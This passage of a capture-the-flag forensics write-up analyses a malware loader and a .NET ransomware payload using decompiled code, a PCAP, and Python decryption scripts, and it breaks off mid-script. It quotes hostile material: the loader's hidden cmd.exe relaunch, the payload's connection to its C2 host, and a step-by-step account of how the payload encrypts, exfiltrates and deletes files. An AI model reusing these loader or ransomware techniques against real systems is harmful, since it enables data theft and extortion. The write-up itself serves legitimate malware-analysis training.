    WCHAR   cmdBuf[0x208];
    sub_1400011A0(cmdBuf,
        L"cmd.exe /C ping 127.0.0.1 -n 10 > Nul & \"%ls\"", selfPath);

    /* -----------------------------------------------------------------
      13.  Spawn hidden child
       ----------------------------------------------------------------- */
    STARTUPINFOW         si = { sizeof(si) };
    PROCESS_INFORMATION  pi = {0};

    CreateProcessW(NULL,          // application
                   cmdBuf, NULL, NULL,
                   FALSE,         // inherit handles
                   CREATE_NO_WINDOW,  // dwCreationFlags
                   NULL, NULL,
                   &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* -----------------------------------------------------------------
      14.  Graceful exit
       ----------------------------------------------------------------- */
    return 0;


/* -----------------------------------------------------------------------
   Common failure exits
   ----------------------------------------------------------------------- */
fail_net:
    WSACleanup();
    return 1;
}
```

Ok, now that we know all of this — **where is the challenge flag?!?**

It could be:

- One of the **hardcoded markers** (`"z11gj1"`, `"533_11s4"`)
    
- Hidden inside the **encrypted resource (blob B)**
    
- The expected **hostname** after XOR (used as a key)
    
- Or even embedded in the **.NET payload** (blob A + blob B)
    

---

Let’s start by exclusion:

### ✅ The remote C2 doesn’t respond — not usable:
```bash
C:\Users\XXX>curl -v http://utube.online:31337/
* Could not resolve host: utube.online
* shutting down connection #0
curl: (6) Could not resolve host: utube.online
```

So we **can’t rely on the C2** to get blob A or any second-stage response. The challenge **definitely doesn’t require bypassing this**.

---

### 🧠 Mental map so far:

- **Hardcoded markers**: Just signal stage transitions — no sign of flag-like content
    
- **Blob A**: Comes from C2 — we can't get it → ❌
    
- **Blob B**: Is **local**, inside the resource `.rsrc` → ✅ accessible
    
- `sub_140001010`: RC4-style decryption used on blob B
    
- The **XOR key** for that decryption is derived from:
    
    - `recv(buf)` → we can't get it
        
    - But also from `hostname ^= buf` → meaning **the final key is unknown without the remote buf**
        
- However, **RC4 decryptions are reversible**, and **blob B is static and local** — so the flag **may be stored inside** (either in plaintext or obfuscated)
    

---

Next logical step:  
🕵️ **Deep-dive into the decrypted blob B**, possibly dumped via a debugger or static dump **after the decryption routine** — it may contain:

- A hardcoded string (flag format, readable in memory)
    
- .NET payload with flag in metadata or string table
    
- Config block, maybe with fake C2 response / test vector
    

That’s likely the final clue.

```bash
╔════════════════════════════════════════════════════════╗
║ main.exe ║
║ ┌──────────────────────────────────────────────────┐ ║
║ │ network blob A (0x1E00 bytes, RC4-encrypted) │◄─┐║
║ └──────────────────────────────────────────────────┘ │║
║ ┌──────────────────────────────────────────────────┐ │║ merged at +0xDB0
║ │ resource blob B (RT_RCDATA id 0x65 “e”) │──┼┴► RWX buffer
║ └──────────────────────────────────────────────────┘ │
║ │
║ sub_140001010 (RC4-like, same key) │
║ ▲ │
║ hostname ⊕ first-reply (key-material) │

╚══════════════════════════════════════════════════════╝
```

It seems there's no way to decrypt blob B without the server connection, because the key depends on the **XOR between the hostname and the first reply**, and we don’t know either. The key length itself is tied to the hostname length, which is also unknown.

We could try to brute-force blob B, but that would require us to **predict the start of its decrypted content**, and since blob B is likely the **second half** of a shellcode or PE file, we’re missing the easy-to-guess `MZ` header. Even guessing a known pattern like `HTB{` would require impractical GPU power.

We might consider brute-forcing the **hostname**, but without knowing the first C2 reply (or vice versa), it’s impossible—even if we assume the result starts with something like `HTB`.

---

So my last hope is that the **key must be related to the two hardcoded markers**:

- `z11gj1`
    
- `533_11s4`
    

But… I must be dumb. I got so caught up in the binary analysis that I completely forgot:  
We have another **goldmine** in our hands — the **PCAP file**!

Of course — even if the C2 is offline, we already captured the **entire network exchange between the victim and the C2**.

Let’s reopen Wireshark and filter for `tcp.port == 31337` and we see:

![Screenshot](Images/Pasted%20image%2020250717165703.png)

Obviously, `192.168.0.104` is our C2 server that was contacted.  
To confirm that `104` is indeed the malicious C2, we can filter with `frame contains "utube.online"` and we see here:

![Screenshot](Images/Pasted%20image%2020250717165731.png)

The above confirms what we discovered during our initial analysis: it’s the victim requesting the `.exe` file from the C2 — confirming that `192.168.0.104` is the **C2**, and `192.168.0.115` is the **victim**.

In the same way, we can filter for the handshake marker sent by the victim to the C2 using `frame contains "z11gj1"`

![Screenshot](Images/Pasted%20image%2020250717165741.png)

Above, we can see that the first relevant frame is **No. 681**, which corresponds to the transfer of the `.exe` file to the victim. We're **not interested** in that one — we already have the file.

What **does** interest us is the **other frame** containing `"z11gj1"` — **Frame No. 1133** — which is exactly when the **victim sent the handshake** to the C2 to initiate the exchange and obtain the encrypted key.

So, let’s **follow this TCP stream** — and we can now see the **entire communication** between the victim and the C2!

![Screenshot](Images/Pasted%20image%2020250717170027.png)
Above, we can see the **first handshake and its response** (the encrypted key), followed by the **second handshake and its response** (the encrypted blob A)!

Great — now let’s **save the stream as raw data**, so we can work on it **outside of Wireshark**, for example in a hex editor or custom script:

![Screenshot](Images/Pasted%20image%2020250717170117.png)

So now that we have these pieces of information, what can we do? We have **two options**:

---

### **1. Brute-forcing the decryption key via known headers**

Since we know that **blob A** is a .NET shellcode or binary, we can reasonably assume the **decrypted blob A** might start with a known magic like `"MZ"`, `".Net"`, etc.

We could try brute-forcing the key until we see such a known magic — but:

- We don’t know the key’s length (likely the hostname length)
    
- The key might be long and complex
    
- This would be **computationally heavy and inefficient**
    

➡️ **Not ideal**

---

### **2. Trying to recover the hostname used in the XOR key**

We only know the result of:

```vbnet
key[i] = host[i] XOR receivedFromC2[i]
```

We **have** `receivedFromC2`, but not the `host`.

We could brute-force `host[i]` using common patterns:

- `"PC-"`
    
- `"DESKTOP-"`
    
- `"LAPTOP-"`
    
- `"WIN-"`
    

But that’s still speculative.

---

### 💡 **Better idea: check for hostname leaks in the PCAP!**

Let’s inspect traffic around the victim’s IP  `ip.addr == 192.168.0.115` We notice:

- Communication with **various online services** (likely no hostname leaks there)
    
- More interestingly: communication with another local IP → `192.168.0.105`
    

And the protocols involved are:

- **SMB**
    
- **TCP**
    
- **SMB2**
    
- **KRB5**
    

These are exactly the kinds of protocols that often **leak NetBIOS or full hostnames**.

---

### 🧠 Based on traffic patterns:

- `192.168.0.115` is the **victim**
    
- `192.168.0.104` is the **C2**
    
- `192.168.0.105` appears to be the **Domain Controller (DC)** — due to the authentication and file-sharing protocols in use
    

➡️ Next logical step: **look into SMB/SMB2/kerberos packets** from the victim to 105 and search for leaked hostname strings.


![Screenshot](Images/Pasted%20image%2020250717170156.png)

Bingo! Protocol Kerberos5 leaks the network name:

![Screenshot](Images/Pasted%20image%2020250717170211.png)

- **Domain name:** `MEGACORP.LOCAL`
    
- **Username:** `rick.a`
    
- The victim (`192.168.0.115`) attempts connections to:
    
    - `\\dc01\IPC$`
        
    - `cifs/dc01`

Please note that after further investigation in Wireshark, I observed that the malicious server (`192.168.0.104`) interacted with the victim (`192.168.0.115`) over **three different ports**:

- **8000** → Used to send the initial `.exe` file (the one we've been analyzing)
    
- **31337** → Used for the victim’s handshake and C2 stage-1/stage-2 communication
    
- **31338** → **Not yet investigated**, but I’m **99% sure** this will be used **after** the .NET blob is decrypted and executed
    

Just for reference, here is the filter to isolate that traffic `ip.addr == 192.168.0.104 && tcp.port == 31338`

And here is the corresponding screenshot:

![Screenshot](Images/Pasted%20image%2020250717170605.png)

It seems we finally have something concrete to work with.

Since the API call `GetComputerNameExA(ComputerNamePhysicalDnsHostname, host, &hostLen);` typically returns the **host portion** of the machine's FQDN (i.e. the part before the dot in a domain name), or just the **computer name**, we can try leveraging the discovered clues from the PCAP.

We know the victim likely belongs to `MEGACORP.LOCAL` and connects to `dc01`, with the user `rick.a`.

We also now have the captured `netBuf` from the **first handshake reply**:

```hex
netBuf = 91 03 34 F1 1D 76 44 E3
```

Let’s now write a **Python3 script** that tries candidate hostnames against this buffer to recover the RC4 key, and decrypt **blob A**.

Let’s put it all together.

```python
#!/usr/bin/env python3  
_"""  
main.py – brute-test guessed computer-names against blobA.bin  
  
For each candidate HOST:  
mutated_host = HOST[i] XOR netBuf[i] (0 ≤ i < len(HOST))  
RC4-decrypt blobA with that mutated_host  
stop when the plaintext begins with 'MZ' (PE header)  
  
Edit BASE and SUFFIXES to widen / narrow the search space.  
"""  
  
_from pathlib import Path  
  
# ----------------------------------------------------------------------  
# ❶ INPUTS  
# ----------------------------------------------------------------------  
BLOB_PATH = Path(r"C:\Users\xxx\Desktop\blobA.bin") # <- adjust if needed  
NET_BUF_HEX = "91 03 34 F1 1D 76 44 E3"  
NET_BUF = bytes.fromhex(NET_BUF_HEX.replace(" ", ""))  
  
# Guessed host-name bases (case-insensitive)  
BASE = [  
"RICK-A", "rick.a", "RICKA", "RICK-A-PC", "RICK-PC", "RICKA-PC",  
"DESKTOP-RICK", "RICKDESKTOP",  
"DC01", "DC01-PC", "DESKTOP-DC01",  
"MEGACORP", "MEGACORP.LOCAL", "CIFS", "MEGACORP-PC", "MEGACORP01",  
]  
SUFFIXES = ["", "-PC", "-01", "-1"]  
  
# ----------------------------------------------------------------------  
# ❷ HELPERS  
# ----------------------------------------------------------------------  
def xor_bytes(a: bytes, b: bytes) -> bytes:  
return bytes(x ^ y for x, y in zip(a, b))  
  
def rc4_decrypt(key: bytes, data: bytes) -> bytes:  
_"""RC4 implementation identical to the malware’s routine."""  
_# --- KSA ---  
S = list(range(256))  
j = 0  
for i in range(256):  
j = (j + S[i] + key[i % len(key)]) & 0xFF  
S[i], S[j] = S[j], S[i]  
  
# --- PRGA ---  
out = bytearray(len(data))  
i = j = 0  
for k in range(len(data)):  
i = (i + 1) & 0xFF  
j = (j + S[i]) & 0xFF  
S[i], S[j] = S[j], S[i]  
t = (S[i] + S[j]) & 0xFF  
out[k] = data[k] ^ S[t]  
return bytes(out)  
  
# ----------------------------------------------------------------------  
# ❸ MAIN LOOP  
# ----------------------------------------------------------------------  
def main() -> None:  
blob_enc = BLOB_PATH.read_bytes()  
print(f"[+] Loaded encrypted blob ({len(blob_enc)} bytes)")  
  
for host in sorted({(b + s).upper() for b in BASE for s in SUFFIXES}):  
if len(host) == 0 or len(host) > len(NET_BUF):  
continue # need ≤ 8 bytes (we only have 8 bytes of netBuf)  
  
host_bytes = host.encode("ascii")  
mutated_key = xor_bytes(host_bytes, NET_BUF[:len(host_bytes)])  
  
plain = rc4_decrypt(mutated_key, blob_enc)  
  
if plain.startswith(b"MZ"):  
key_hex = mutated_key.hex()  
print(f"\n[!] FOUND! Host='{host}', mutated_key={key_hex}")  
outfile = BLOB_PATH.with_name("blobA_decrypted.bin")  
outfile.write_bytes(plain)  
print(f"[+] Decrypted blob saved to {outfile}")  
return  
  
print("[-] No match found with current candidate list.")  
  
if __name__ == "__main__":  
main()
```

```bash
python.exe C:\Users\xxx\PycharmProjects\PythonProject\main.py
[+] Loaded encrypted blob (7680 bytes)
[!] FOUND! Host='MEGACORP', mutated_key=dc4673b05e3916b3
[+] Decrypted blob saved to C:\Users\xxx\Desktop\blobA_decrypted.bin
```

BOOM!

![Screenshot](Images/Pasted%20image%2020250717171021.png)

We successfully decrypted the new **.NET file** that the process attempts to load! 😄

Now, to reconstruct the full working executable, we need to:

1. **Extract the encrypted `blobB` resource** from `xQWdrq.exe`  
    → Use **Resource Hacker** to save it as a raw binary file
    
2. **Decrypt `blobB`** using the **same RC4 key** discovered earlier  
    → Just adapt the existing decryption script accordingly to process `blobB` as input

```python
#!/usr/bin/env python3

"""

decrypt_blob.py – RC‑4‑decrypt blobB.bin with a known key

"""
from pathlib import Path

# ----------------------------------------------------------------------
# ❶ USER SETTINGS
# ----------------------------------------------------------------------
INFILE = Path(r"C:\Users\xxx\Desktop\blobB.bin") # blob to decrypt
OUTFILE = INFILE.with_name(INFILE.stem + "_decrypted.bin")
KEY_HEX = "dc4673b05e3916b3" # ← your mutated_key
KEY = bytes.fromhex(KEY_HEX)


# ----------------------------------------------------------------------
# ❷ RC‑4 (same routine you used before)
# ----------------------------------------------------------------------
def rc4_decrypt(key: bytes, data: bytes) -> bytes:
	S = list(range(256))
	j = 0
	for i in range(256): # KSA
		j = (j + S[i] + key[i % len(key)]) & 0xFF
		S[i], S[j] = S[j], S[i]
		out = bytearray(len(data))
		i = j = 0

	for k in range(len(data)): # PRGA
		i = (i + 1) & 0xFF
		j = (j + S[i]) & 0xFF
		S[i], S[j] = S[j], S[i]
		t = (S[i] + S[j]) & 0xFF
		out[k] = data[k] ^ S[t]
	return bytes(out)

# ----------------------------------------------------------------------
# ❸ DECRYPT & SAVE
# ----------------------------------------------------------------------
def main() -> None:
	cipher = INFILE.read_bytes()
	print(f"[+] Loaded {len(cipher)}‑byte blob")

	plain = rc4_decrypt(KEY, cipher)
	OUTFILE.write_bytes(plain)
	print(f"[+] Decrypted blob written to {OUTFILE}")

	# quick sanity‑check
	if plain[:2] == b"MZ":
		print("[✓] Looks like a PE file (starts with 'MZ').")
	else:
		print("[i] Decryption finished – signature doesn’t start with 'MZ'.")
  
if __name__ == "__main__":
	main()
```

![Screenshot](Images/Pasted%20image%2020250717171232.png)

3. **Merge `blobA` and `blobB`**, just like the loader malware was doing:  
    → Open `blobA` in a hex editor  
    → Patch its content at **offset `0xDB0`** with the full content of `blobB`  
    → Save the modified file
    

✅ **Done!**  
We now have the **fully rebuilt stage 2** payload.

![Screenshot](Images/Pasted%20image%2020250717171250.png)

We can use dnSpy to have a look at the .NET disassembled plus a couple of more hints:

![Screenshot](Images/Pasted%20image%2020250717171318.png)

Here we can see that the payload is using the **`System.Net.Sockets`** and **`System.Security.Cryptography`** namespaces — these are strong indicators of potentially dangerous functionality.

When combined in malicious code, they can allow:

- Communication with remote **C2 servers** or other network targets
    
- **Encryption or exfiltration** of data
    
- Potential implementation of **ransomware**, **stealthy backdoors**, or **secure loaders**
    

It’s definitely worth exploring more of the listed **classes and methods** in the tree to understand the behavior in detail.

![Screenshot](Images/Pasted%20image%2020250717171345.png)

Those method names definitely appear suspicious and likely related to **ransomware activity** — good to take note of them.

Before jumping into full code analysis, let’s review the **header properties** of the `Payload` assembly. A few key observations:

- **TimeDateStamp**: Clearly **tampered** — it resolves to `15/09/2083 01:47:26`, which matches the other fake timestamps in the file.
    
- **AddressOfEntryPoint**: Set to `0` — suspicious, though not critical in this case since the original loader `.exe` directly invokes the correct entry point via reflection or dynamic execution.
    
- **Checksum**: `0` — another sign of tampering or deliberate omission.
    
- **Subsystem**: Windows CUI (Console) — expected.
    
- **Data Directories**: Only 3 present:
    
    - **Resource** — contains only the manifest assembly info
        
    - **Debug** — includes two entries, one linked to **Visual C++** (see screenshot)
        

All of this supports the idea that this file is a **custom-built or packed second-stage**, likely designed to evade basic static analysis and behave differently when loaded in-memory.

![Screenshot](Images/Pasted%20image%2020250717171510.png)

(PEBear screenshot)  
And the **.NET directory** — the one most important for our analysis.

Now, let’s move into the most important part of this:

![Screenshot](Images/Pasted%20image%2020250717171525.png)

In the above screenshot, we see the class **`CorpClass`**, which contains a method named **`EntryPoint`** — very likely the true execution entry.

Right from initialization, it already does something **cheeky**:

- Checks if a **debugger is attached**, and if so, exits immediately
    
- Otherwise, it calls **`EncryptFiles`**, starting from the `%USER%\Documents` directory
    

This clearly behaves like **ransomware**.

A quick glance at the visible strings also shows:

```csharp
tcpClient.Connect("utube.online", 31338);
```

— just as we suspected earlier (and a great reminder to revisit **Wireshark** traffic on port `31338` later).

For now, let’s continue analyzing the methods in `dnSpy`

Let’s continue inspecting these methods one by one:

1. **EntryPoint**: receives a parameter called `key` (so our previous .NET loader will pass the key to it → based on how this method is called, I see that this key is the RC4 key used to decrypt blobA and blobB, so it’s `"dc4673b05e3916b3"`)  
    1.1. Checks if a debugger is present  
    1.2. Gets `%USER%\Documents`  
    1.3. Calls `EncryptFiles`, passing `user_folder_path` as argument along with the key
    
2. **EncryptFiles**:  
    2.1. Gets directories contained in `%USER%\Documents`  
    2.2. Loops through each directory found  
    2.3. Gets files in each directory  
    2.4. Calls `EncryptFile` for each file found, passing the RC4 key  
    2.5. Calls `EncryptFile` for the directory name itself, passing the RC4 key
    
3. **EncryptFile**:  
    3.1. Calls `Stego.CreateKey`:  
    3.1.1. Uses a class called `cspParameters` to define parameters  
    3.1.2. Initializes an encryptor class `RSACryptoServiceProvider` with key length 1024  
    3.1.3. Creates public and private keys  
    3.2. Reads the current target file  
    3.3. Saves the result of `Guid.NewGuid().ToByteArray()` into `array2`  
    3.4. Initializes an MD5 digestor  
    3.5. Computes MD5 hash of the random GUID and stores it in `array3`  
    3.6. Stores result into `text3` as base64  
    3.7. Calls `Graphy.Encrypt`, passing file bytes and base64 random string  
    3.7.1. `Graphy.Encrypt` is defined as `Graphy.Encrypt<RijndaelManaged>(bytes, password)`  
    3.8. Creates new filename as `oldfilename + ".enc"`  
    3.9. Calls `Stego.Encrypt`, passing the MD5 random hash and RSA public key  
    3.9.1. Returns result of `rsacryptoServiceProvider.Encrypt(MD5_hash, false)`  
    3.10. Converts the RC4 key into byte array  
    3.11. Stores in `array6` the result of XOR between RC4 key and private key  
    3.12. Calculates the sum of lengths of XORed key + RSA encrypted MD5  
    3.13. Initializes a TCP client  
    3.14. Connects to `utube.online:31338`  
    3.15. Sends that length sum to the C2  
    3.16. Waits for a one-byte ACK from the server  
    3.17. Builds `array8` by concatenating RSA-encrypted MD5 and XOR-obfuscated private key  
    3.18. Sends `array8` to C2  
    3.19. Waits for another single-byte ACK  
    3.20. Creates XOR-obfuscated version of target filename `.enc` with RC4 key and puts into `array9`  
    3.21. Sends length of `array9` as string to C2  
    3.22. Waits for ACK  
    3.23. Sends obfuscated filename `array9`  
    3.24. Waits for ACK  
    3.25. Sends length of `array4` (AES-encrypted file)  
    3.26. Waits for ACK  
    3.27. Uploads encrypted file byte-by-byte until full array is written  
    3.28. Polls stream until server returns `"end"`  
    3.29. Closes network stream and TCP connection  
    3.30. Deletes the original (now-encrypted) local file
    

Ok this challenge is becoming very lengthy (thanks for the fun author). What we see above is a crypto-confusion chaos, so where is our flag? Obviously, the code is telling us to look back again at the PCAP file because the info is transmitted over the network (which contains the encrypted communication between victim and C2). In all this chaos though, something is clear: there are values that we know (like the RC4_key) and many other used keys that we don’t know because they depend on the on-the-fly randomly generated GUID and their respective mutated forms (MD5, Base64, AES, etc... why so many algorithms author?!?!?).

So the challenge obviously must revolve around what we **do** know — the **RC4 key**. Observing the behavior again, we see that the RC4 key is used in two places:

1. **To generate an XOR key** by XORing the RC4 key with a randomly generated RSA `privateKey` →  
    At first glance, this seems unbruteable since two variables are missing:
    
    - The **privateKey** (which is generated on the fly and lives only in memory)
        
    - The **XORed result**, which we initially don’t know  
        But wait — in step **3.17**, we see the victim sends to the C2 a **concatenated payload** of `RSA_cipher + XOR_result`.  
        → So we **do** have the XOR result!  
        Technically, to solve:

```ini
RSA_cipher = RC4_key XOR XOR_result
```

1. We now have **RC4_key** and **XOR_result**, so we can solve for `RSA_cipher`.
    
2. In **step 3.20**, RC4 is **directly** used to **XOR-encrypt the file name**, which is then sent to the C2.  
    This is much easier — since:
    
    - We have the **encrypted filename** in the PCAP
        
    - We have the **RC4 key**
        
    - We can simply reverse the XOR to get the original filename
        

---

Let’s start with the easier part — **point 2** above.

We’ll reopen the PCAP, extract the **entire raw communication** between `192.168.0.115` and `192.168.0.104` on **port 31338** using Wireshark → and then analyze it to extract the **encrypted filename**.

```python
#!/usr/bin/env python3

# xor_decrypt.py

  
  

DATA_HEX = (

"9F7C2FE52D5C64C080341AD3351777EF982910C5335C78C7"

"AF1A30DC3F4A65DABA2F16D4024A73D0AE23079E3449719DB928"

)

  
  

KEY = bytes.fromhex("dc4673b05e3916b3") # 8-byte repeating XOR key

  
  

cipher = bytes.fromhex(DATA_HEX)

plain = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(cipher))

  
  

print("Decrypted bytes (hex):", plain.hex())

print("Decrypted bytes (ascii, best-effort):", plain.decode(errors="replace"))
```

```bash
C:\Users\xxx\Desktop\Malception>python.exe filename_decryptor.py

Decrypted bytes (hex): 433a5c55736572735c7269636b2e615c446f63756d656e74735c436c61737369666965645c7365637265742e6a70672e656e

Decrypted bytes (ascii, best-effort): C:\Users\rick.a\Documents\Classified\secret.jpg.enc
```

This confirms we are in the right place.

It’s obvious at this point that our goal must be to obtain the **AES key** used to encrypt `secret.jpg.enc`.  
To do so, let’s recall where the AES key originates from:

```bash
password used to AES_encrypt_file: base64 <-- MD5 <-- 16-byte-random-GUID
```

So our final target is that **base64 string**. But if we look again at what was sent over the network during step **3.17**, we see that the **RSA-encrypted MD5 hash** was transmitted.  
This means we **don’t need to reverse all the way up** to the random GUID — we can simply:

- **Decrypt the RSA-encrypted MD5**
    
- Then **base64-encode** it
    
- And use that as the AES decryption password
    

So the goal becomes to retrieve the **original MD5 hash**, which is:

- Hidden inside the **RSA-encrypted blob**
    
- Sent to the C2 (and available in the PCAP)
    
- Encrypted with a known public key (extracted from the .NET payload)
    

---

### 🧠 Mental Scheme:

The password used to `AES_encrypt_file` is base54 derived from MD5 as follow:

```bash 
			base64 <-- MD5 <-- 16-byte-random-GUID  
                       ^  
                       |  
         RSA-encrypted MD5 result (sent at 3.17)  
                       ^  
                       |  
				1) RSA public key    <-- RSA-XORED result (sent at 3.17)  
					   +                       ^
				2) MD5 hash                    |
									[RC4 key] (XOR) [RSA-deciphered text]
```

So, to obtain the required MD5 hash, we need:

1. The RSA public key used to encrypt the MD5.
    
2. The RSA-encrypted MD5 result, which we already have from the stream.
    

To get there, let’s focus on the data we can already extract—starting with point 1 above, in order to retrieve the RSA-ciphered text. To do this, we need to extract the XOR result from the network stream. Since we know it was concatenated with the RSA cipher at stage 3.17, we’ll need the exact offset at which the private key starts in the stream (the XOR result will follow immediately after that):

**Offset rule:**

- `array8` = RSA ciphertext (`array5`) + XOR-obfuscated private key string (`array6`).
    
- `array5` is the raw RSA block, produced by a 1024-bit key ⇒ 1024 bits / 8 = 128 bytes.
    
- Therefore, the XOR-masked portion (`array6`) always begins at byte 128 (0x80) of the payload observed on the wire.
    

To extract the XOR-masked XML private key string, we need to read from offset `0x80` in `array8` (as found in the pcap), up to the next `0x51`, which is the length specified in the next step.

Here is the Python script:  

```python
#!/usr/bin/env python3

# xor_unmask_privkey.py
HEX_BLOB = """
E0 14 20 F1 15 5C 6F E5 BD 2A 06 D5 60 05 5B DC B8 33 1F C5 2D 07 65 DF 8C 2F 11 D9 11 78 7E EB EF 1F 35 FC 67 09 4E DF 9A 0A 11 D8 39 57 7B C9 AC 02 18 D7 0E 57 5C C1 8A 0D 41 83 19 0D 63 D6 B8 77 2A DD 27 0C 78 C6 EC 07 10 F6 24 0A 6C FA B5 2E 1F C0 37 01 21 DE 86 09 40 FE 75 6F 25 FF 86 7E 0B C0 32 6E 61 EA 86 10 1B 9B 3A 5B 55 C6 9D 15 00 C1 3B 69 54 C3 96 30 5C D2 38 4B 3D E4 97 07 02 F7 6B 41 5B FC A5 08 35 80 1D 0F 24 E0 B8 11 26 C2 6B 5F 72 DC 90 2F 0B FD 2B 53 61 C5 99 1C 43 DF 15 5F 5F D5 85 28 41 D5 24 12 44 D1 93 2D 1D 83 2F 7E 26 D9 A5 03 5C D2 6A 74 43 E3 89 7B 4F 9F 13 56 72 C6 B0 33 00 8E 62 7C 6E C3 B3 28 16 DE 2A 07 57 E2 9D 04 4F 9F 1B 41 66 DC B2 23 1D C4 60 05 46 8D EC 23 06 82 67 5C 52 8B 95 16 40 FC 0A 7C 6E 81 8B 7E 24 F8 16 4F 72 C6 88 3C 27 E2 69 0E 63 D6 88 30 22 FA 69 01 74 DA 9A 09 47 FA 30 4C 39 E7 EB 0F 18 9F 28 53 60 C4 84 15 25 F7 6F 56 52 EA 96 01 4B D5 2C 7B 7B E9 88 0B 07 D8 18 53 5C DD BB 7F 0B DA 6F 4E 2B 8E E0 69 23 8E 62 68 28 81 84 2C 26 F1 6F 4F 5E C5 B4 22 46 E1 6A 6B 65 E1 E8 3E 3C 9F 07 78 59 C2 9E 25 25 FB 6C 0C 61 9C 9F 02 11 86 10 7E 42 E6 89 7F 30 85 6A 12 27 F6 B4 16 29 D4 36 6C 57 F4 9B 0F 22 E2 15 6D 5F 81 ED 2E 39 EA 6A 5F 21 F0 B8 71 40 FE 33 70 70 82 90 2A 2A F5 29 04 2B 8F F3 17 4D 8C 1A 69 28 EB 8D 3F 46 F3 29 7B 6E D4 B7 1F 4A D1 08 72 6C EB 98 27 22 DB 16 00 66 FB 9E 71 09 C4 75 49 4F EB F3 0A 47 C6 14 49 44 98 97 2D 27 F2 2F 48 43 F8 E5 0B 1A C5 1A 63 7A D0 EC 14 18 C8 1F 41 43 C4 AF 01 1E C6 11 0F 42 84 EE 04 05 EA 2F 7F 62 F5 8E 31 39 9F 0F 04 2B 8F F3 02 23 8E 62 7D 47 8D B8 0C 12 85 33 43 2F E4 93 72 04 D3 16 00 27 D1 AD 73 22 F7 11 6B 59 CB 8E 7F 46 C7 14 78 59 DE B3 14 26 F1 2D 75 4E F0 A8 07 34 85 0A 58 7B E4 B1 37 25 83 30 6D 24 C6 F7 2B 3C F1 3D 43 6F D4 A6 2F 4A C2 6E 4E 6E C0 AB 37 3F 89 36 16 58 D7 93 76 4A FF 3C 4E 2B 8E E0 69 37 E1 60 05 5F DD AA 23 01 C3 3B 68 28 C4 EE 15 21 EA 2C 4A 67 87 B1 0C 46 9B 6C 71 5C F8 89 01 19 D1 15 0A 4F FD B9 28 46 81 0C 56 50 D5 AE 16 41 C0 75 74 44 D0 F7 12 58 E2 6E 73 7C D5 A4 76 18 E6 10 53 22 CA 94 09 4B D4 1A 0C 6E F1 88 75 1F F2 75 7E 22 D2 A8 34 1D D2 07 16 42 FD AB 2A 0A DA 0F 04 2B 8F F3 0F 1D C6 3B 4B 65 D6 8D 78 4F F4 60 7B 57 CA 98 2E 46 C9 33 4F 7B F6 A8 00 00 C5 1D 7A 59 FA AA 36 36 F2 17 73 73 87 BF 33 02 E0 66 7A 23 E7 A5 0A 1A DC 09 0B 51 F4 E8 6D 39 FD 38 60 2E CB B8 3E 1A 89 09 74 46 85 AC 0A 39 F9 2C 77 39 86 EA 37 58 DB 30 4B 73 C0 EE 3F 14 C5 0C 69 5A FC BB 0E 2B C7 38 7D 5D DB B4 03 0B C2 3F 72 58 81 9B 1E 43 D3 17 5C 59 E0 93 0B 3F 85 24 40 7D DF 9B 3E 1F D4 67 5F 44 DA E4 2A 07 DE 6B 5B 5C C2 B9 1C 1A 80 26 50 4F D8 8C 3E 03 F9 32 50 55 E4 8D 77 42 DF 12 5D 58 CA E5 08 23 FF 12 5F 70 DF 99 34 34 C5 1C 6F 75 F6 E1 7A 5C F4 60 05 39 E1 8F 07 38 D5 27 6F 77 DF A9 23 4D

"""


KEY_HEX = "dc4673b05e3916b3"
KEY = bytes.fromhex(KEY_HEX) # 8-byte repeating key

# ----------------------------------------------------------------------

def xor_decrypt(cipher: bytes, key: bytes) -> bytes:
	klen = len(key)
	return bytes(b ^ key[i % klen] for i, b in enumerate(cipher))
  
def main():
	cipher_bytes = bytes.fromhex(''.join(HEX_BLOB.split()))
	plain_bytes = xor_decrypt(cipher_bytes, KEY)

  
# Show as UTF-8 (XML) and also save
try:
	print(plain_bytes.decode('utf-8'))
except UnicodeDecodeError:
	print("[!] Decrypted data isn’t pure UTF-8; dumping hex instead.")
	print(plain_bytes.hex())

with open("priv.xml", "wb") as f:
	f.write(plain_bytes)
	print("[+] Saved to priv.xml")
  
if __name__ == "__main__":
	main()
```

Saved content of priv.xml generated:

![Screenshot](Images/Pasted%20image%2020250717174112.png)

Now that we have all the private factors within the `<RSAKeyValue>` block, we can fully reconstruct the 1024-bit RSA key and decrypt the first 128 bytes captured from the wire to recover the original 16-byte MD5 hash.

Let’s do that using another Python script (`rsa_md5_decrypt.py`):

```python
#!/usr/bin/env python3
# rsa_md5_decrypt.py  •  pip install pycryptodome

from base64 import b64decode, b64encode
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher   import PKCS1_v1_5

# ──────────────────────────────────────────────────────────────────────
XML_PATH = "priv.xml"          # your decrypted <RSAKeyValue> file
CIPHERTEXT_HEX = (
    "9F 96 25 71 C8 0D 66 8C 67 80 31 1E 03 71 7B 80 "
    "6A 9E 56 C3 B2 BF A2 15 63 9C 68 C0 53 46 56 D9 "
    "88 96 DD 7F 25 27 A3 3A 1D 9D 1A 7E 9B E7 2A 3D "
    "69 3A 54 CC 97 59 6F 47 61 30 83 8C 0F 9C 92 E0 "
    "14 9F 63 4D 07 DD 11 91 ED 06 91 FE D8 2B CE 82 "
    "CC 91 46 0F 2E 03 CE E7 4F 3F FE 3F 8A 62 91 4B "
    "08 77 BF 62 03 CB D0 40 0E 0A 84 C6 B0 E4 AB F1 "
    "39 03 9A 4A FD 2F BA 57 E2 78 F7 49 BA B5 1E E7 "
)
# ──────────────────────────────────────────────────────────────────────

def tag(xml: str, name: str) -> bytes:
    """Base64-decode <name> … </name>."""
    part = xml.split(f"<{name}>")[1].split(f"</{name}>")[0]
    return b64decode(part)

def build_key(xml_text: str) -> RSA.RsaKey:
    n = int.from_bytes(tag(xml_text, "Modulus"),  "big")
    e = int.from_bytes(tag(xml_text, "Exponent"), "big")
    d = int.from_bytes(tag(xml_text, "D"),        "big")
    p = int.from_bytes(tag(xml_text, "P"),        "big")
    q = int.from_bytes(tag(xml_text, "Q"),        "big")

    # pycryptodome will recompute dp, dq, iq and verify them
    if p < q:                          # RSA.construct expects p > q
        p, q = q, p
    return RSA.construct((n, e, d, p, q))

def main() -> None:
    xml = Path(XML_PATH).read_text(encoding="utf-8")
    priv  = build_key(xml)
    cipher = PKCS1_v1_5.new(priv)

    ct = bytes.fromhex(CIPHERTEXT_HEX.replace(" ", ""))
    md5 = cipher.decrypt(ct, sentinel=b"\x00")   # sentinel dummy

    if len(md5) != 16:
        raise ValueError("Decryption failed – check ciphertext or key.")

